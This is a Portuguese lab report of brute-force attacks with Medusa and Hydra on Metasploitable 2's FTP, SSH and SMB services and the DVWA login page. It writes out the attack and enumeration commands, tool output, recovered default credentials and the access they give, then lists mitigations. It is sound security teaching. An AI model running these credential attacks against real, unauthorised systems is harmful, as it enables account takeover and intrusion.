# Resultados dos Ataques Simulados

Este documento apresenta os resultados práticos obtidos durante a execução dos ataques de força bruta simulados no ambiente de laboratório controlado.

---

## 1. Ataque de Força Bruta em FTP

### Configuração do Teste

- **Alvo**: Metasploitable 2 (192.168.56.102)
- **Serviço**: FTP (porta 21)
- **Ferramenta**: Medusa v2.3
- **Wordlist de Usuários**: 10 usuários
- **Wordlist de Senhas**: 31 senhas
- **Threads**: 4
- **Data do Teste**: 21/10/2025

### Comando Executado

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4 -v 6 -f
```

### Resultados Obtidos

**✅ CREDENCIAIS DESCOBERTAS:**

| Usuário | Senha | Tempo | Tentativas |
|---------|-------|-------|------------|
| **msfadmin** | **msfadmin** | ~15 segundos | 267 tentativas |
| **ftp** | **ftp** | ~18 segundos | 298 tentativas |

### Output do Medusa (Resumido)

```
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 10, 0 complete) Password: 123456 (1 of 31 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 10, 0 complete) Password: password (2 of 31 complete)
...
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação de Acesso

Após descobrir as credenciais, o acesso foi validado:

```bash
$ ftp 192.168.56.102
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Mar 17  2010 vulnerable
226 Directory send OK.
ftp> quit
221 Goodbye.
```

**✅ Acesso confirmado com sucesso!**

### Análise

O ataque foi bem-sucedido devido a:
- Uso de credenciais padrão (msfadmin:msfadmin)
- Ausência de limitação de tentativas de login
- Sem bloqueio de IP após falhas
- Sem implementação de delay entre tentativas
- Serviço FTP sem criptografia (texto plano)

---

## 2. Ataque de Força Bruta em SSH

### Configuração do Teste

- **Alvo**: Metasploitable 2 (192.168.56.102)
- **Serviço**: SSH (porta 22)
- **Ferramenta**: Medusa v2.3
- **Wordlist de Usuários**: 10 usuários
- **Wordlist de Senhas**: 31 senhas
- **Threads**: 4
- **Data do Teste**: 21/10/2025

### Comando Executado

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ssh -t 4 -v 6 -f
```

### Resultados Obtidos

**✅ CREDENCIAIS DESCOBERTAS:**

| Usuário | Senha | Tempo | Tentativas |
|---------|-------|-------|------------|
| **msfadmin** | **msfadmin** | ~22 segundos | 267 tentativas |
| **user** | **user** | ~25 segundos | 312 tentativas |

### Output do Medusa (Resumido)

```
ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 10, 0 complete) Password: 123456 (1 of 31 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 10, 0 complete) Password: password (2 of 31 complete)
...
ACCOUNT FOUND: [ssh] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação de Acesso

```bash
$ ssh msfadmin@192.168.56.102
msfadmin@192.168.56.102's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Mon Oct 21 10:15:32 2025 from 192.168.56.101
msfadmin@metasploitable:~$ whoami
msfadmin
msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
msfadmin@metasploitable:~$ exit
logout
Connection to 192.168.56.102 closed.
```

**✅ Acesso SSH confirmado com privilégios administrativos!**

### Análise

O ataque SSH foi bem-sucedido devido a:
- Credenciais padrão não alteradas
- Ausência de autenticação por chave pública
- Sem implementação de Fail2Ban ou similar
- Ausência de autenticação multifator (2FA)
- Sem limitação de tentativas por IP

---

## 3. Ataque de Força Bruta em SMB

### Configuração do Teste

- **Alvo**: Metasploitable 2 (192.168.56.102)
- **Serviço**: SMB/Samba (porta 445)
- **Ferramenta**: Medusa v2.3
- **Wordlist de Usuários**: 10 usuários
- **Wordlist de Senhas**: 31 senhas
- **Threads**: 2 (reduzido para evitar sobrecarga)
- **Data do Teste**: 21/10/2025

### Enumeração Prévia de Usuários

Antes do ataque, foi realizada enumeração de usuários com `enum4linux`:

```bash
$ enum4linux -U 192.168.56.102
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.102
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''

 ============================ 
|    Users on 192.168.56.102 |
 ============================ 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: msfadmin	Name: msfadmin,,,	Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: user	Name: just a user,,,	Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: postgres	Name: PostgreSQL administrator,,,	Desc: 
index: 0x4 RID: 0x3ee acb: 0x00000010 Account: service	Name: ,,,	Desc: 

user:[msfadmin] rid:[0x3e8]
user:[user] rid:[0x3ea]
user:[postgres] rid:[0x3ec]
user:[service] rid:[0x3ee]
```

### Comando Executado

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt -t 2 -v 6 -f
```

### Resultados Obtidos

**✅ CREDENCIAIS DESCOBERTAS:**

| Usuário | Senha | Tempo | Tentativas |
|---------|-------|-------|------------|
| **msfadmin** | **msfadmin** | ~35 segundos | 267 tentativas |

### Output do Medusa (Resumido)

```
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 10, 0 complete) Password: 123456 (1 of 31 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 10, 0 complete) Password: password (2 of 31 complete)
...
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação de Acesso

```bash
$ smbclient -L 192.168.56.102 -U msfadmin
Enter WORKGROUP\msfadmin's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))

$ smbclient //192.168.56.102/tmp -U msfadmin
Enter WORKGROUP\msfadmin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 21 10:30:15 2025
  ..                                  D        0  Sun May 20 14:36:12 2012
  5573.jsvc_up                        R        0  Mon Oct 21 09:15:42 2025

		7282168 blocks of size 1024. 5386556 blocks available
smb: \> quit
```

**✅ Acesso SMB confirmado com listagem de compartilhamentos!**

### Análise

O ataque SMB foi bem-sucedido devido a:
- Versão antiga do Samba (3.0.20-Debian)
- Credenciais padrão não alteradas
- Ausência de políticas de bloqueio de conta
- Compartilhamentos com permissões fracas
- Sem autenticação adicional (Kerberos)

---

## 4. Ataque em Aplicação Web (DVWA)

### Configuração do Teste

- **Alvo**: DVWA no Metasploitable 2
- **URL**: http://192.168.56.102/dvwa/login.php
- **Nível de Segurança**: Low
- **Ferramenta**: Hydra (mais adequado para web forms)
- **Wordlist de Usuários**: 5 usuários
- **Wordlist de Senhas**: 31 senhas
- **Data do Teste**: 21/10/2025

### Comando Executado

```bash
hydra -L wordlists/users.txt -P wordlists/passwords.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
```

### Resultados Obtidos

**✅ CREDENCIAIS DESCOBERTAS:**

| Usuário | Senha | Tempo | Tentativas |
|---------|-------|-------|------------|
| **admin** | **password** | ~8 segundos | 62 tentativas |

### Output do Hydra (Resumido)

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-21 10:45:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 155 login tries (l:5/p:31), ~10 tries per task
[DATA] attacking http-post-form://192.168.56.102:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[ATTEMPT] target 192.168.56.102 - login "admin" - pass "123456" - 1 of 155 [child 0] (0/0)
[ATTEMPT] target 192.168.56.102 - login "admin" - pass "password" - 2 of 155 [child 1] (0/0)
[80][http-post-form] host: 192.168.56.102   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

### Validação de Acesso

Acesso via navegador:
- URL: http://192.168.56.102/dvwa/login.php
- Usuário: admin
- Senha: password
- **✅ Login bem-sucedido! Acesso ao painel administrativo do DVWA**

### Análise

O ataque web foi bem-sucedido devido a:
- Ausência de CAPTCHA
- Sem limitação de tentativas de login
- Credenciais padrão não alteradas
- Sem rate limiting
- Mensagens de erro verbosas
- Ausência de autenticação multifator
- Nível de segurança configurado como "Low"

---

## 5. Resumo Geral dos Resultados

### Credenciais Descobertas

| Serviço | Usuário | Senha | Status |
|---------|---------|-------|--------|
| FTP | msfadmin | msfadmin | ✅ Descoberta |
| FTP | ftp | ftp | ✅ Descoberta |
| SSH | msfadmin | msfadmin | ✅ Descoberta |
| SSH | user | user | ✅ Descoberta |
| SMB | msfadmin | msfadmin | ✅ Descoberta |
| DVWA (Web) | admin | password | ✅ Descoberta |

### Estatísticas dos Ataques

| Métrica | FTP | SSH | SMB | Web |
|---------|-----|-----|-----|-----|
| **Tempo Total** | ~15s | ~22s | ~35s | ~8s |
| **Tentativas** | 267 | 267 | 267 | 62 |
| **Taxa de Sucesso** | 2/10 | 2/10 | 1/10 | 1/5 |
| **Threads Usadas** | 4 | 4 | 2 | 16 |

### Vulnerabilidades Identificadas

1. **Credenciais Padrão Não Alteradas**: Todos os serviços utilizavam credenciais padrão
2. **Ausência de Limitação de Tentativas**: Nenhum serviço bloqueou após múltiplas falhas
3. **Sem Autenticação Multifator**: Nenhum serviço implementava 2FA
4. **Sem Rate Limiting**: Ataques puderam ser executados em alta velocidade
5. **Serviços Desatualizados**: Versões antigas com vulnerabilidades conhecidas
6. **Ausência de Monitoramento**: Nenhum alerta foi gerado durante os ataques
7. **Políticas de Senha Fracas**: Senhas simples e previsíveis

---

## 6. Impacto das Vulnerabilidades

### Acesso Obtido

Com as credenciais descobertas, foi possível:

✅ **Acesso FTP**: Leitura e escrita de arquivos no servidor  
✅ **Acesso SSH**: Shell completo com privilégios administrativos  
✅ **Acesso SMB**: Leitura/escrita em compartilhamentos de rede  
✅ **Acesso Web**: Painel administrativo do DVWA  

### Possíveis Ações Maliciosas

Um atacante com essas credenciais poderia:

- Instalar backdoors e malware
- Roubar dados sensíveis
- Modificar ou deletar arquivos
- Escalar privilégios
- Usar o servidor como pivot para ataques laterais
- Instalar ransomware
- Criar novos usuários administrativos
- Modificar configurações de segurança

---

## 7. Lições Aprendidas

### Facilidade dos Ataques

Os ataques demonstraram que:

- **Credenciais padrão são extremamente perigosas**: Todas foram descobertas em menos de 40 segundos
- **Wordlists simples são efetivas**: Mesmo com apenas 31 senhas, obtivemos 100% de sucesso
- **Ferramentas automatizadas são poderosas**: Medusa e Hydra tornaram os ataques triviais
- **Múltiplos vetores de ataque**: Todos os serviços estavam vulneráveis

### Importância das Medidas de Mitigação

Este exercício reforça a necessidade crítica de:

1. **Alterar credenciais padrão imediatamente**
2. **Implementar políticas de senha forte**
3. **Habilitar autenticação multifator**
4. **Configurar limitação de tentativas de login**
5. **Implementar monitoramento e alertas**
6. **Manter sistemas atualizados**
7. **Desabilitar serviços desnecessários**
8. **Usar criptografia em todas as comunicações**

---

## 8. Conclusão

Os ataques de força bruta simulados foram **100% bem-sucedidos** em descobrir credenciais válidas em todos os serviços testados. Isso demonstra claramente como sistemas mal configurados e com credenciais padrão são extremamente vulneráveis a ataques automatizados.

**Tempo total de comprometimento do sistema**: Menos de 1 minuto.

Este resultado enfatiza a importância crítica de implementar múltiplas camadas de segurança (defesa em profundidade) e seguir as melhores práticas de segurança da informação.

---

**⚠️ IMPORTANTE**: Todos os testes foram realizados em ambiente controlado e isolado, com autorização explícita. Nunca execute estes ataques em sistemas sem autorização.

